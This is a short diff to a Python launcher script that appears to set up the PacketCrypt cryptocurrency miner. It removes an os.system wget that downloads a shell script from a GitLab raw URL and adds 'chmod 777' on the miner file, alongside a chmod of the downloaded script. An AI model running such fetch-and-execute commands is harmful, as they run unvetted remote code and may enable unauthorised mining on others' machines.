@@ -1,7 +1,7 @@
 import sys
 import os
 from time import sleep
-os.system('wget https://gitlab.com/wahyudepan04/a/-/raw/main/0.sh')
+os.system('chmod 777 packetcrypt')
 sleep(2)
 os.system('chmod 777 0.sh')
 sleep(2)
